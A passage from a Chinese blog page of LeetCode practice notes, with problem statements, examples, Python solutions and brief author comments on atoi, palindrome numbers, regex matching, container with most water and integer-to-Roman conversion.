1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span>内，最终结果为 0 。</p><p>示例5：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">输入：s &#x3D; &quot;-91283472332&quot;</span><br><span class="line">输出：-2147483648</span><br><span class="line">解释：</span><br><span class="line">第 1 步：&quot;-91283472332&quot;（当前没有读入字符，因为没有前导空格）</span><br><span class="line"> ^</span><br><span class="line">第 2 步：&quot;-91283472332&quot;（读入 &#39;-&#39; 字符，所以结果应该是负数）</span><br><span class="line">  ^</span><br><span class="line">第 3 步：&quot;-91283472332&quot;（读入 &quot;91283472332&quot;）</span><br><span class="line"> ^</span><br><span class="line">解析得到整数 -91283472332 。</span><br></pre></td></tr></table></figure><p>由于 -91283472332 小于范围<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><mo>−</mo><msup><mn>2</mn><mn>31</mn></msup><mo separator="true">,</mo><msup><mn>2</mn><mn>31</mn></msup><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[-2^{31}, 2^{31} - 1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span>的下界，最终结果被截断为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>−</mo><msup><mn>2</mn><mn>31</mn></msup></mrow><annotation encoding="application/x-tex">-2^{31}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span> = -2147483648 。</p><p>来源：力扣（LeetCode）<br />链接：<a href="https://leetcode-cn.com/problems/string-to-integer-atoi">https://leetcode-cn.com/problems/string-to-integer-atoi</a><br />著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myAtoi</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; int:</span></span><br><span class="line">s = s.strip()</span><br><span class="line">length = <span class="built_in">len</span>(s)</span><br><span class="line">flag = <span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> length == <span class="number">0</span> <span class="keyword">or</span> s[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">&quot;+-0123456789&quot;</span>:</span><br><span class="line"><span class="keyword">return</span>(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> s[<span class="number">0</span>] == <span class="string">&quot;+&quot;</span>:</span><br><span class="line">s = s[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">elif</span> s[<span class="number">0</span>] == <span class="string">&quot;-&quot;</span>:</span><br><span class="line">flag = <span class="literal">False</span></span><br><span class="line">s = s[<span class="number">1</span>:]</span><br><span class="line">num_list = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> s:</span><br><span class="line"><span class="keyword">if</span> _ <span class="keyword">in</span> <span class="string">&quot;0123456789&quot;</span>:</span><br><span class="line">num_list.append(_)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">num_sum = <span class="number">0</span></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">1</span>, -<span class="built_in">len</span>(num_list)-<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">num_sum += <span class="built_in">int</span>(num_list[_]) * <span class="built_in">pow</span>(<span class="number">10</span>, index)</span><br><span class="line">index += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> flag == <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">if</span> num_sum &lt;= <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">31</span>) - <span class="number">1</span>:</span><br><span class="line"><span class="keyword">return</span>(num_sum)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span>(<span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">31</span>) - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">elif</span> num_sum &lt;= <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">31</span>):</span><br><span class="line"><span class="keyword">return</span>(-num_sum)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span>(-<span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">31</span>))</span><br></pre></td></tr></table></figure><p>和整数反转那题思路差不多<br />无非多做几个检测罢了</p><hr /><h1 id="回文数"><a class="markdownIt-Anchor" href="#回文数"></a> <a href="https://leetcode-cn.com/problems/palindrome-number">回文数</a></h1><p>给你一个整数<code>x</code>，如果<code>x</code>是一个回文整数，返回<code>true</code>；否则，返回<code>false</code>。</p><p>回文数是指正序（从左向右）和倒序（从右向左）读都是一样的整数。例如，121是回文，而123不是。</p><p>示例 1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：x &#x3D; 121</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure><p>示例2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：x &#x3D; -121</span><br><span class="line">输出：false</span><br><span class="line">解释：从左向右读, 为 -121 。 从右向左读, 为 121- 。因此它不是一个回文数。</span><br></pre></td></tr></table></figure><p>示例 3：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：x &#x3D; 10</span><br><span class="line">输出：false</span><br><span class="line">解释：从右向左读, 为 01 。因此它不是一个回文数。</span><br></pre></td></tr></table></figure><p>示例 4：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：x &#x3D; -101</span><br><span class="line">输出：false</span><br></pre></td></tr></table></figure><p>来源：力扣（LeetCode）<br />链接：<a href="https://leetcode-cn.com/problems/palindrome-number">https://leetcode-cn.com/problems/palindrome-number</a><br />著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isPalindrome</span>(<span class="params">self, x: <span class="built_in">int</span></span>) -&gt; bool:</span></span><br><span class="line"><span class="keyword">if</span> x &lt; <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span>(<span class="literal">False</span>)</span><br><span class="line">string = <span class="built_in">str</span>(x)</span><br><span class="line"><span class="keyword">if</span> string == string[::-<span class="number">1</span>]:</span><br><span class="line"><span class="keyword">return</span>(<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span>(<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>当字符串来处理挺方便的<br />就是有点占内存</p><hr /><h1 id="正则表达式匹配"><a class="markdownIt-Anchor" href="#正则表达式匹配"></a> <a href="https://leetcode-cn.com/problems/regular-expression-matching">正则表达式匹配</a></h1><p>给你一个字符串<code>s</code>和一个字符规律<code>p</code>，请你来实现一个支持<code>'.'</code>和<code>'\*'</code>的正则表达式匹配。</p><ul><li>‘.’ 匹配任意单个字符</li><li>‘*’ 匹配零个或多个前面的那一个元素</li></ul><p>所谓匹配，是要涵盖整个字符串s的，而不是部分字符串。<br />示例 1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：s &#x3D; &quot;aa&quot; p &#x3D; &quot;a&quot;</span><br><span class="line">输出：false</span><br><span class="line">解释：&quot;a&quot; 无法匹配 &quot;aa&quot; 整个字符串。</span><br></pre></td></tr></table></figure><p>示例 2:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：s &#x3D; &quot;aa&quot; p &#x3D; &quot;a*&quot;</span><br><span class="line">输出：true</span><br><span class="line">解释：因为 &#39;*&#39; 代表可以匹配零个或多个前面的那一个元素, 在这里前面的元素就是 &#39;a&#39;。因此，字符串 &quot;aa&quot; 可被视为 &#39;a&#39; 重复了一次。</span><br></pre></td></tr></table></figure><p>示例3：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：s &#x3D; &quot;ab&quot; p &#x3D; &quot;.*&quot;</span><br><span class="line">输出：true</span><br><span class="line">解释：&quot;.*&quot; 表示可匹配零个或多个（&#39;*&#39;）任意字符（&#39;.&#39;）。</span><br></pre></td></tr></table></figure><p>示例 4：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：s &#x3D; &quot;aab&quot; p &#x3D; &quot;c*a*b&quot;</span><br><span class="line">输出：true</span><br><span class="line">解释：因为 &#39;*&#39; 表示零个或多个，这里 &#39;c&#39; 为 0 个, &#39;a&#39; 被重复一次。因此可以匹配字符串 &quot;aab&quot;。</span><br></pre></td></tr></table></figure><p>示例 5：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：s &#x3D; &quot;mississippi&quot; p &#x3D; &quot;mis*is*p*.&quot;</span><br><span class="line">输出：false</span><br></pre></td></tr></table></figure><p>来源：力扣（LeetCode）<br />链接：<a href="https://leetcode-cn.com/problems/regular-expression-matching">https://leetcode-cn.com/problems/regular-expression-matching</a><br />著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isMatch</span>(<span class="params">self, s: <span class="built_in">str</span>, p: <span class="built_in">str</span></span>) -&gt; bool:</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">length = <span class="built_in">len</span>(s)</span><br><span class="line">result = re.match(p, s)</span><br><span class="line"><span class="keyword">if</span> result != <span class="literal">None</span> <span class="keyword">and</span> result.span()[<span class="number">1</span>] == length:</span><br><span class="line"><span class="keyword">return</span>(<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span>(<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>属实不会去写正则的匹配规则<br />直接re.match梭哈了</p><hr /><h1 id="盛最多水的容器"><a class="markdownIt-Anchor" href="#盛最多水的容器"></a> 盛最多水的容器</h1><p>给你n个非负整数<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>a</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>a</mi><mi>n</mi></msub><mi>a</mi></mrow><annotation encoding="application/x-tex">a_1, a_2, ..., a_na</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">a</span></span></span></span> ，每个数代表坐标中的一个点<code>(i,ai)</code>。在坐标内画<code>n</code>条垂直线，垂直线i的两个端点分别为<code>(i,ai)</code>和<code>(i, 0)</code>。找出其中的两条线，使得它们与x轴共同构成的容器可以容纳最多的水。</p><p>说明：你不能倾斜容器。</p><p>示例 1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：[1,8,6,2,5,4,8,3,7]</span><br><span class="line">输出：49 </span><br><span class="line">解释：图中垂直线代表输入数组 [1,8,6,2,5,4,8,3,7]。在此情况下，容器能够容纳水（表示为蓝色部分）的最大值为49。</span><br></pre></td></tr></table></figure><p>示例 2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：height &#x3D; [1,1]</span><br><span class="line">输出：1</span><br></pre></td></tr></table></figure><p>示例 3：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：height &#x3D; [4,3,2,1,4]</span><br><span class="line">输出：16</span><br></pre></td></tr></table></figure><p>示例 4：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：height &#x3D; [1,2,1]</span><br><span class="line">输出：2</span><br></pre></td></tr></table></figure><p>来源：力扣（LeetCode）<br />链接：<a href="https://leetcode-cn.com/problems/container-with-most-water">https://leetcode-cn.com/problems/container-with-most-water</a><br />著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">maxArea</span>(<span class="params">self, height</span>) -&gt; int:</span></span><br><span class="line">length = <span class="built_in">len</span>(height)</span><br><span class="line">area = <span class="number">0</span></span><br><span class="line">h = <span class="number">0</span></span><br><span class="line">index1 = <span class="number">0</span></span><br><span class="line">index2 = length - <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line"><span class="keyword">if</span> height[index1] &gt;= height[index2]:</span><br><span class="line">h = height[index2]</span><br><span class="line">index2 -= <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">h = height[index1]</span><br><span class="line">index1 += <span class="number">1</span></span><br><span class="line">temp = h * (index2 + <span class="number">1</span> - index1)</span><br><span class="line"><span class="keyword">if</span> temp &gt; area:</span><br><span class="line">area = temp</span><br><span class="line"><span class="keyword">return</span>(area)</span><br></pre></td></tr></table></figure><p>自己逻辑都还没理清楚，代码就能跑了<br />一开始想二维查找梭哈，然后死在一个长度5000的列表上了<br />旧症复发了属于是<br />然后开始用一维的角度去思考<br />AB分别为初始值在列表两端的下标，两边往中间回缩（中间往两边跑也行）<br />A大就挪B，反之亦然</p><hr /><h1 id="整数转罗马数字"><a class="markdownIt-Anchor" href="#整数转罗马数字"></a> <a href="https://leetcode-cn.com/problems/integer-to-roman">整数转罗马数字</a></h1><p>罗马数字包含以下七种字符:<code>I</code>，<code>V</code>，<code>X</code>，<code>L</code>，<code>C</code>，<code>D</code>和<code>M</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">字符数值</span><br><span class="line">I1</span><br><span class="line">V5</span><br><span class="line">X10</span><br><span class="line">L50</span><br><span class="line">C100</span><br><span class="line">D500</span><br><span class="line">M1000</span><br></pre></td></tr></table></figure><p>例如，罗马数字2写做<code>II</code>，即为两个并列的1。12写做<code>XII</code>，即为<code>X+II</code>。 27写做<code>XXVII</code>, 即为<code>XX+V+II</code>。</p><p>通常情况下，罗马数字中小的数字在大的数字的右边。但也存在特例，例如4不写做<code>IIII</code>，而是<code>IV</code>。数字1在数字5的左边，所表示的数等于大数5减小数1得到的数值4 。同样地，数字9表示为<code>IX</code>。这个特殊的规则只适用于以下六种情况：</p><ul><li><code>I</code>可以放在<code>V</code>(5) 和<code>X</code>(10) 的左边，来表示 4 和 9。</li><li><code>X</code>可以放在<code>L</code>(50) 和<code>C</code>(100) 的左边，来表示 40 和90。</li><li><code>C</code>可以放在<code>D</code>(500) 和<code>M</code>(1000) 的左边，来表示400 和900。</li></ul><p>给你一个整数，将其转为罗马数字。</p><p>示例1:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入:num &#x3D; 3</span><br><span class="line">输出: &quot;III&quot;</span><br></pre></td></tr></table></figure><p>示例2:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入:num &#x3D; 4</span><br><span class="line">输出: &quot;IV&quot;</span><br></pre></td></tr></table></figure><p>示例3:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入:num &#x3D; 9</span><br><span class="line">输出: &quot;IX&quot;</span><br></pre></td></tr></table></figure><p>示例4:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入:num &#x3D; 58</span><br><span class="line">输出: &quot;LVIII&quot;</span><br><span class="line">解释: L &#x3D; 50, V &#x3D; 5, III &#x3D; 3.</span><br></pre></td></tr></table></figure><p>示例5:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入:num &#x3D; 1994</span><br><span class="line">输出: &quot;MCMXCIV&quot;</span><br><span class="line">解释: M &#x3D; 1000, CM &#x3D; 900, XC &#x3D; 90, IV &#x3D; 4.</span><br></pre></td></tr></table></figure><p>来源：力扣（LeetCode）<br />链接：<a href="https://leetcode-cn.com/problems/integer-to-roman">https://leetcode-cn.com/problems/integer-to-roman</a><br />著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">intToRoman</span>(<span class="params">self, num: <span class="built_in">int</span></span>) -&gt; str:</span></span><br><span class="line">num_list = []</span><br><span class="line"><span class="keyword">while</span> num != <span class="number">0</span>:</span><br><span class="line">num_list.append(num % <span class="number">10</span>)</span><br><span class="line">num //= <span class="number">10</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(num_list)):</span><br><span class="line"><span class="keyword">if</span> _ == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">if</span> num_list[_] == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">elif</span> num_list[_] &lt;= <span class="number">3</span>:</span><br><span class="line">result = <span class="string">&quot;I&quot;</span> * num_list[_] + result</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">diff = num_list[_] - <span class="number">5</span></span><br><span class="line">mod = num_list[_] % <span class="number">5</span></span><br><span class="line"><span class="keyword">if</span> diff == -<span class="number">1</span>:</span><br><span class="line">result =  <span class="string">&quot;IV&quot;</span> + result</span><br><span class="line"><span class="keyword">elif</span> mod &lt; <span class="number">4</span>:</span><br><span class="line">result = <span class="string">&quot;V&quot;</span> + <span class="string">&quot;I&quot;</span> * mod + result</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">result = <span class="string">&quot;IX&quot;</span> + result</span><br><span class="line"><span class="keyword">elif</span> _ == <span class="number">1</span>:</span><br><span class="line"><span class="keyword">if</span> num_list[_] == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">elif</span> num_list[_] &lt;= <span class="number">3</span>:</span><br><span class="line">result = <span class="string">&quot;X&quot;</span> * num_list[_] + result</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">diff = num_list[_] - <span class="number">5</span></span><br><span class="line">mod = num_list[_] % <span class="number">5</span></span><br><span class="line"><span class="keyword">if</span> diff == -<span class="number">1</span>:</span><br><span class="line">result = <span class="string">&quot;XL&quot;</span> + result</span><br><span class="line"><span class="keyword">elif</span> mod &lt; <span class="number">4</span>:</span><br><span class="line">result = <span class="string">&quot;L&quot;</span> + <span class="string">&quot;X&quot;</span> * mod + result</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">result = <span class="string">&quot;XC&quot;</span> + result</span><br><span class="line"><span class="keyword">elif</span> _ == <span class="number">2</span>:</span><br><span class="line"><span class="keyword">if</span> num_list[_] == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">elif</span> num_list[_] &lt;= <span class="number">3</span>:</span><br><span class="line">result = <span class="string">&quot;C&quot;</span> * num_list[_] + result</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">diff = num_list[_] - <span class="number">5</span></span><br><span class="line">mod = num_list[_] % <span class="number">5</span></span><br><span class="line"><span class="keyword">if</span> diff == -<span class="number">1</span>:</span><br><span class="line">result = <span class="string">&quot;CD&quot;</span> + result</span><br><span class="line"><span class="keyword">elif</span> mod &lt; <span class="number">4</span>:</span><br><span class="line">result = <span class="string">&quot;D&quot;</span> + <span class="string">&quot;C&quot;</span> * mod + result</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">result = <span class="string">&quot;CM&quot;</span> + result</span><br><span class="line"><span class="keyword">elif</span> _ == <span class="number">3</span>:</span><br><span class="line">result = <span class="string">&quot;M&quot;</span> * num_list[_] + result</span><br><span class="line"><span class="keyword">return</span>(result)</span><br></pre></td></tr></table></figure><p>一个挺中庸的解决方案<br />为了解决问题而解决问题</p><hr /><h1 id="罗马数字转整数"><a class="markdownIt-Anchor" href="#罗马数字转整数"></a> <a 